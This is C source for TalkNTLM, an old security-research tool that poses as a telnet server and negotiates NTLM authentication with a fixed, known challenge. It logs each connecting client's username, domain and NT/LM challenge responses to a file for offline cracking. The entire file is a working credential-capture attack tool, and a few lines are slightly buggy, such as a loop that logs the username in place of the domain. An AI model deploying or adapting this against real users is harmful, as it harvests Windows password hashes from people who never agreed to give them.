/* TalkNTLM - NTLM Logging Telnet Server
 * dildog@atstake.com
 * 8/14/00
 * Copyright (C) 2000 @stake, Inc.
 */

#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>
#include<ctype.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<netinet/in.h>
#include<arpa/inet.h>

#define MAJOR_VERSION 1
#define MINOR_VERSION 0

#define IAC     255             /* interpret as command: */
#define DONT    254             /* you are not to use option */
#define DO      253             /* please, you use option */
#define WONT    252             /* I won't use option */
#define WILL    251             /* I will use option */
#define SB      250             /* interpret as subnegotiation */              
#define SE      240             /* end sub negotiation */
#define AUTH    37
#define IS      0
#define SEND    1
#define REPLY   2
#define NAME    3
#define NTLM    15

#define ACCEPT 1

typedef enum {
  METHOD_NONE=0,
  METHOD_TELNET
} METHOD;

typedef enum {
  SUBMETHOD_NONE=0,
  SUBMETHOD_LOG,
} SUBMETHOD;

#define COMMSOCK_BUFSIZ 2048
FILE *g_fCommSock;
char g_CommSockBuf[COMMSOCK_BUFSIZ];

void error(const char *str)
{
  fflush(stdout);
  fprintf(stderr,str);
  fflush(stderr);
}

unsigned char getb(void)
{
  unsigned char b=0;
  fread(&b,1,1,g_fCommSock);
  return b;
}

unsigned short getdwl(void)
{
  unsigned short s=0;
  s|=((unsigned short)getb());
  s|=((unsigned short)getb())<<8;
  return s;
}

unsigned long getddl(void)
{
  unsigned long l=0;
  l|=((unsigned long)getb());
  l|=((unsigned long)getb())<<8;
  l|=((unsigned long)getb())<<16;
  l|=((unsigned long)getb())<<24;
  return l;
}

void putb(unsigned char c)
{
  fwrite(&c,1,1,g_fCommSock);
}

void putdwl(unsigned short w)
{
  putb(w&255);
  putb((w>>8)&255);
}

void putddl(unsigned long d)
{
  putb(d&255);
  putb((d>>8)&255);
  putb((d>>16)&255);
  putb((d>>24)&255);
}


void putarrb(int n, unsigned char *b)
{
  int i;
  for(i=0;i<n;i++) {
    putb(b[i]);
  }
}

void putarrc(int n, char *c)
{
  putarrb(n,(unsigned char *)c);
}

void putflush(void)
{
  fflush(g_fCommSock);
}


void debugb(unsigned char c)
{
  fprintf(stderr,"%d\t\t%X\t'%c'\n\r",c,c,(isalnum(c)?c:' '));
}


int listenport(int port, struct sockaddr_in *rsaddr)
{
  // Create socket
  int s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if(s<0) {
    error("couldn't create socket.\n");
    return -1;
  }

  int reuse=1;
  if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&reuse,sizeof(int))<0) {
    error("couldn't set socket option.\n");
    close(s);
    return -2;
  }

  // Bind to port
  struct sockaddr_in saddr;
  memset(&saddr,0,sizeof(struct sockaddr_in));
  saddr.sin_port=htons(port);
  saddr.sin_family=AF_INET;
 
  if(bind(s,(struct sockaddr *)&saddr,sizeof(struct sockaddr_in))<0) {
    error("couldn't bind.\n");
    close(s);
    return -3;
  }

  // Listen on port;
  if(listen(s,1)<0) {
    error("couldn't listen.\n");
    close(s);
    return -4;
  }

  // Accept connection
  unsigned int socklen=sizeof(struct sockaddr_in);
  memset(rsaddr,0,socklen);
  int as;
  if((as=accept(s,(struct sockaddr *)rsaddr,&socklen))<0) {
    error("couldn't accept.\n");
    close(s);
    return -5;
  }

  // Close listener
  close(s);
  
  return as;
}

int do_telnet_log(int port, char *logfile)
{

  FILE *lf=NULL;

  while(1) {
    
    // Wait for telnet connection to come in
    struct sockaddr_in saddr;
    int s;
    printf("listening on port %d.\n",port);
    if((s=listenport(port,&saddr))<0) {
      error("telnet logging abort.\n");
      return -1;
    }
    printf("recieved telnet connection from %s:%u.\n",
	   inet_ntoa(saddr.sin_addr),ntohs(saddr.sin_port));

    // Set this socket as out buffered packet socket
    g_fCommSock=fdopen(s,"r+b");
    if(g_fCommSock==NULL) {
      error("couldn't fdopen comm socket.\n");
      close(s);
      return -2;
    }
    setvbuf(g_fCommSock,g_CommSockBuf,_IOFBF,COMMSOCK_BUFSIZ);

    // Open logging file
    lf=fopen(logfile,"a+t");
    if(lf==NULL) {
      error("couldn't open log file.\n");
      fclose(g_fCommSock);
      return -3;
    }
    
    // Challenge to send
    unsigned char challenge[8]={255,255,255,255,255,255,255,255};

    // Start authentication process
    unsigned char *respbuf=NULL;
    int size=0;
    
    putb(IAC);
    putb(DO);
    putb(AUTH);
    putflush();
    printf(">> IAC DO AUTH\n");
    
    // See if client wants to authenticate
    if(getb()!=IAC) goto telnetlogfail;
    if(getb()!=WILL) goto telnetlogfail;
    if(getb()!=AUTH) goto telnetlogfail;
    printf("<< IAC WILL AUTH\n");
    
    // Present authentication methods
    putb(IAC);
    putb(SB);
    putb(AUTH);
    putb(SEND);
    putb(NTLM);
    putb(0);
    putb(IAC);
    putb(SE);
    putflush();
    printf(">> IAC SB AUTH SEND NTLM 0 IAC SE\n");
    
    // Get NTLMSSP initial request
    if(getb()!=IAC) goto telnetlogfail;
    if(getb()!=SB) goto telnetlogfail;
    if(getb()!=AUTH) goto telnetlogfail;
    if(getb()!=IS) goto telnetlogfail;
    if(getb()!=NTLM) goto telnetlogfail;
    if(getb()!=0) goto telnetlogfail;
    if(getb()!=0) goto telnetlogfail;
    
    size=getddl()+4;
    if(size>2048) goto telnetlogfail;
    respbuf=(unsigned char *)malloc(size);
    int i;
    for(i=0;i<size;i++) {
      respbuf[i]=getb();
    }
    free(respbuf);
    if(getb()!=IAC) goto telnetlogfail;
    if(getb()!=SE) goto telnetlogfail;
    
    printf("<< IAC SB AUTH IS NTLM 0 0 ... IAC SE\n");
    
    // Send accept
    putb(IAC);
    putb(SB);
    putb(AUTH);
    putb(REPLY);
    putb(NTLM);
    putb(0);
    putb(ACCEPT);
    
    putddl(0xA8);
    putddl(0x2);
    putarrc(8,"NTLMSSP");
    putddl(0x2);
    putdwl(0x14);
    putdwl(0x14);
    putddl(0x30);
    putddl(0xE0828295);
    putarrb(8,challenge);
    putarrc(8,"\0\0\0\0\0\0\0\0");
    putdwl(0x64);
    putdwl(0x64);
    putddl(0x44);
    putarrc(20,"A\0B\0C\0D\0E\0F\0G\0H\0I\0J\0");
    putdwl(0x2);
    putdwl(0x14);
    putarrc(20,"A\0B\0C\0D\0E\0F\0G\0H\0I\0J\0");
    putdwl(0x1);
    putdwl(0x14);
    putarrc(20,"A\0B\0C\0D\0E\0F\0G\0H\0I\0J\0");
    putdwl(0x4);
    putdwl(0x14);
    putarrc(20,"A\0B\0C\0D\0E\0F\0G\0H\0I\0J\0");
    putdwl(0x3);
    putdwl(0x14);  
    putarrc(20,"A\0B\0C\0D\0E\0F\0G\0H\0I\0J\0");
    putddl(0);

    putb(IAC);
    putb(SE);
    putflush();
    printf(">> IAC SB AUTH REPLY NTLM 0 1 ... challenge ... IAC SE\n");
  
    // Get the reply packet
    if(getb()!=IAC) goto telnetlogfail;
    if(getb()!=SB) goto telnetlogfail;
    if(getb()!=AUTH) goto telnetlogfail;
    if(getb()!=IS) goto telnetlogfail;
    if(getb()!=NTLM) goto telnetlogfail;
    if(getb()!=0) goto telnetlogfail;
    if(getb()!=2) goto telnetlogfail;

    size=getddl()+4;
    if(size>2048 || size<64) goto telnetlogfail;
    printf("8\n");
    respbuf=(unsigned char *)malloc(size);
    for(i=0;i<size;i++) {
      respbuf[i]=getb();
      //fprintf(stderr,"%2.2X: ",i);
      //debugb(respbuf[i]);
    }
    if(getb()!=IAC) goto telnetlogfail;
    if(getb()!=SE) goto telnetlogfail;

    printf("<< IAC SB AUTH IS NTLM 0 2 ... response ... IAC SE\n");
    
    
    // Get username
    int usernamelen,usernameoff;
    char *username;
    usernamelen=respbuf[0x28] | (respbuf[0x29]<<8);
    usernameoff=respbuf[0x2C] | (respbuf[0x2D]<<8) | 
      (respbuf[0x2E]<<16) | (respbuf[0x2F]<<24);
    username=(char *)malloc(usernamelen);
    if(!username) goto telnetlogfail;
    memcpy(username,&respbuf[usernameoff+4],usernamelen);
    printf("Username: ");
    for(i=0;i<usernamelen;i+=2) {
      printf("%c",username[i]);
      fprintf(lf,"%c",username[i]);
      username[i>>1]=username[i];
    }
    usernamelen>>=1;
    printf("\n");
    fprintf(lf,":");
    free(username);
    
    // Get domainname
    int domainnamelen,domainnameoff;
    char *domainname;
    domainnamelen=respbuf[0x20] | (respbuf[0x21]<<8);
    domainnameoff=respbuf[0x24] | (respbuf[0x25]<<8) | 
      (respbuf[0x26]<<16) | (respbuf[0x27]<<24);
    domainname=(char *)malloc(domainnamelen);
    if(!domainname) goto telnetlogfail;
    memcpy(domainname,&respbuf[domainnameoff+4],domainnamelen);
    printf("Domain: ");
    for(i=0;i<domainnamelen;i+=2) {
      printf("%c",domainname[i]);
      fprintf(lf,"%c",username[i]);
      domainname[i>>1]=domainname[i];
    }
    domainnamelen>>=1;
    printf("\n");
    fprintf(lf,":");
    free(domainname);
    
    // Write challenge
    fprintf(lf,"%2.2X%2.2X%2.2X%2.2X%2.2X%2.2X%2.2X%2.2X:",
	    challenge[0],challenge[1],challenge[2],challenge[3],
	    challenge[4],challenge[5],challenge[6],challenge[7]);

    // Get NT response
    int ntresplen,ntrespoff;
    unsigned char *ntresp;
    ntresplen=respbuf[0x10] | (respbuf[0x11]<<8);
    ntrespoff=respbuf[0x14];// | (respbuf[0x15]<<8) | (respbuf[0x16]<<16) | (respbuf[0x17]<<24);
    ntresp=(unsigned char *)malloc(ntresplen);
    if(!ntresp) goto telnetlogfail;
    memcpy(ntresp,&respbuf[ntrespoff+4],ntresplen);
    printf("NT Response:\n");
    for(i=0;i<ntresplen;i++) {
      printf("%2.2X ",ntresp[i]);
      fprintf(lf,"%2.2X",ntresp[i]);
      if(i%8==7) printf("\n");
    }
    printf("\n");
    fprintf(lf,":");
    free(ntresp);
    
    // Get LM response
    int lmresplen,lmrespoff;
    unsigned char *lmresp;
    lmresplen=respbuf[0x18] | (respbuf[0x19]<<8);
    lmrespoff=respbuf[0x1C] | (respbuf[0x1D]<<8) | 
      (respbuf[0x1E]<<16) | (respbuf[0x1F]<<24);
    lmresp=(unsigned char *)malloc(lmresplen);
    if(!lmresp) goto telnetlogfail;
    memcpy(lmresp,&respbuf[lmrespoff+4],lmresplen);
    printf("LM Response:\n");
    for(i=0;i<lmresplen;i++) {
      printf("%2.2X ",lmresp[i]);
      fprintf(lf,"%2.2X",lmresp[i]);
      if(i%8==7) printf("\n");
    }
    printf("\n");
    fprintf(lf,"\n");
    free(lmresp);  
    
    free(respbuf);
    
    fclose(lf);
    // Close the telnet session
    fclose(g_fCommSock);
    printf("closed telnet socket.\n");

  }

  return 0;
  
 telnetlogfail:; // Failure
  
  if(lf!=NULL)
    fclose(lf);
  printf("telnet negotiation failed.\n");
  fclose(g_fCommSock);
  
  return -5;
}



void usage(char *progname,int exitcode)
{
  printf("talkntlm v%d.%d (%s)\n",MAJOR_VERSION,MINOR_VERSION,progname);
  printf("usage: talkntlm -t [-p <port>] -l <challenge response logfile>\n",progname);
  exit(exitcode);
}


int main(int argc, char *argv[])
{
  unsigned char b;
  int i,tp;
  
  // Get options
  
  int opt_port=0;
  char *opt_logfile=NULL;
  METHOD opt_method=METHOD_NONE;
  SUBMETHOD opt_submethod=SUBMETHOD_NONE;

  char oc;
  while((oc=getopt(argc,argv,"l:p:t"))>0) {
    switch(oc) {
    case 't':
      opt_method=METHOD_TELNET;
      if(opt_port==0) {
	opt_port=23;
      }
      break;
    case 'p':
      opt_port=atoi(optarg);
      break;
    case 'l':
      opt_logfile=optarg;
      if(opt_submethod!=SUBMETHOD_NONE)
	usage(argv[0],-2);
      opt_submethod=SUBMETHOD_LOG;
      break;
    default:
      usage(argv[0],-3);
      
      break;
    }
  }
  
  // Go to the particular method
  if(opt_method==METHOD_NONE) {
    usage(argv[0],-4);
  } 
  else if(opt_method==METHOD_TELNET) {
    
    // Telnet methods
    
    if(opt_submethod==SUBMETHOD_NONE) {
      usage(argv[0],-5);
    
    }
    else if(opt_submethod==SUBMETHOD_LOG) {

      // Telnet hash logging

      if(opt_logfile==NULL) {
	usage(argv[0],-7);
      }
      if(do_telnet_log(opt_port,opt_logfile)!=0)
	return -8;
    
    }

  }

  return 0;
}

























